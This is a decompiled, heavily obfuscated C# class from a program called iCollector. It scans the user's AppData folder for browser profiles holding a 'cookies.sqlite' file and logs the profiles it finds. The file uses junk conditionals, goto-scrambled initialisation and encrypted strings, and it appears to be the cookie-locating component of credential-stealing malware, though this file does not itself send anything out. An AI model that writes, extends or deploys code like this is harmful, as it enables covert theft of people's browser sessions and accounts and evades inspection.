using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using iCollector.Job.Model;
using iCollector.Util;

namespace iCollector.Job.Handler;

internal class CKFResolver
{
	private static readonly string SQL_FILE_NAME_SE;

	private static readonly string SQL_FILE_NAME;

	private static readonly string CLAZZ_NAME_SE;

	private static readonly string CLAZZ_NAME;

	private static readonly string LOG_01_1_SE;

	private static readonly string LOG_01_1;

	private static readonly string LOG_01_2_SE;

	private static readonly string LOG_01_2;

	private static readonly string LOG_01_3_SE;

	private static readonly string LOG_01_3;

	private static readonly string LOG_02_SE;

	private static readonly string LOG_02;

	private Logger log = Logger.Instance();

	private LogContext ctx = new LogContext(CLAZZ_NAME);

	public CKModel Resolve(string path)
	{
		CKModel cKModel = new CKModel();
		CKModel cKModel2 = default(CKModel);
		if (2u != 0 && 0 == 0)
		{
			cKModel2 = cKModel;
		}
		CKModel cKModel3 = cKModel2;
		string path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path);
		if (4u != 0 && 0 == 0)
		{
			cKModel3.Path = path2;
		}
		CKModel cKModel4 = cKModel2;
		string zIF = CKType.ZIF;
		if (5u != 0 && 3u != 0)
		{
			cKModel4.Type = zIF;
		}
		if (!Directory.Exists(cKModel2.Path))
		{
			return cKModel2;
		}
		List<CKProfile> list = ResolveProfiles(cKModel2.Path);
		List<CKProfile> list2 = default(List<CKProfile>);
		if (0 == 0 && 0 == 0)
		{
			list2 = list;
		}
		CKModel cKModel5 = cKModel2;
		List<CKProfile> profiles = list2;
		if (7u != 0)
		{
			cKModel5.Profiles = profiles;
		}
		CKModel cKModel6 = cKModel2;
		bool valid = list2.Count > 0;
		if (2u != 0)
		{
			cKModel6.Valid = valid;
		}
		Logger logger = log;
		LogContext logContext = ctx;
		string[] obj = new string[5] { LOG_01_1, path, LOG_01_2, null, null };
		int count = cKModel2.Profiles.Count;
		int num = default(int);
		if (0 == 0)
		{
			num = count;
		}
		obj[3] = num.ToString();
		obj[4] = LOG_01_3;
		string message = string.Concat(obj);
		if (5u != 0)
		{
			logger.Info(logContext, message);
		}
		return cKModel2;
	}

	private List<CKProfile> ResolveProfiles(string path)
	{
		string[] directories = Directory.GetDirectories(path);
		List<CKProfile> list = new List<CKProfile>();
		List<CKProfile> list2;
		if (true && 2u != 0)
		{
			list2 = list;
		}
		string[] array = default(string[]);
		if (0 == 0 && 0 == 0)
		{
			array = directories;
		}
		int num;
		if (uint.MaxValue != 0 && uint.MaxValue != 0)
		{
			num = 0;
		}
		string text = default(string);
		while (num < array.Length)
		{
			string obj = array[num];
			if (0 == 0 && 0 == 0)
			{
				text = obj;
			}
			while (HasSQLFile(text))
			{
				CKProfile obj2 = new CKProfile
				{
					Path = Path.Combine(path, text)
				};
				string idHeaderPath = Path.Combine(path, text, SQL_FILE_NAME);
				if (0 == 0)
				{
					obj2.IdHeaderPath = idHeaderPath;
				}
				if (0 == 0)
				{
					list2.Add(obj2);
					if (3 == 0)
					{
						continue;
					}
				}
				Logger logger = log;
				LogContext logContext = ctx;
				string message = LOG_02 + Path.Combine(path, text);
				if (0 == 0)
				{
					logger.Info(logContext, message);
				}
				break;
			}
			int num2 = num + 1;
			if (0 == 0)
			{
				num = num2;
			}
		}
		return list2;
	}

	private bool HasSQLFile(string path)
	{
		if (Directory.GetFiles(path).AsEnumerable().Any((string file) => string.Equals(Path.GetFileName(file), SQL_FILE_NAME)))
		{
			return true;
		}
		return false;
	}

	static CKFResolver()
	{
		while (true)
		{
			SQL_FILE_NAME_SE = "cookies.sqlite";
			if (4 == 0 || 1 == 0)
			{
				goto IL_007d;
			}
			SQL_FILE_NAME = SecurityUtils.ReadStructEncrypted(SQL_FILE_NAME_SE);
			if (7u != 0)
			{
				CLAZZ_NAME_SE = "CKFResolver";
			}
			CLAZZ_NAME = SecurityUtils.ReadStructEncrypted(CLAZZ_NAME_SE);
			LOG_01_1_SE = "scanned path: ";
			LOG_01_1 = SecurityUtils.ReadStructEncrypted(LOG_01_1_SE);
			if (8 == 0)
			{
				continue;
			}
			LOG_01_2_SE = ", found: ";
			LOG_01_2 = SecurityUtils.ReadStructEncrypted(LOG_01_2_SE);
			if (6u != 0)
			{
				goto IL_0073;
			}
			goto IL_00a5;
			IL_007d:
			LOG_01_3 = SecurityUtils.ReadStructEncrypted(LOG_01_3_SE);
			LOG_02_SE = "found ckProfile: ";
			LOG_02 = SecurityUtils.ReadStructEncrypted(LOG_02_SE);
			goto IL_00a5;
			IL_0073:
			LOG_01_3_SE = " profiles";
			goto IL_007d;
			IL_00a5:
			if (6 == 0)
			{
				goto IL_0073;
			}
			if (true)
			{
				break;
			}
			goto IL_007d;
		}
	}
}
